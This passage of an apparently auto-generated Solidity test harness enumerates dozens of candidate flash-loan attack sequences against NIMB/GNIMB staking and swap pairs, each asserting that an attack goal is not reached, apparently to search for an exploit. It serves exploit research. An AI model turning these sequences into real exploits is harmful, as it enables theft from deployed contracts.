        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
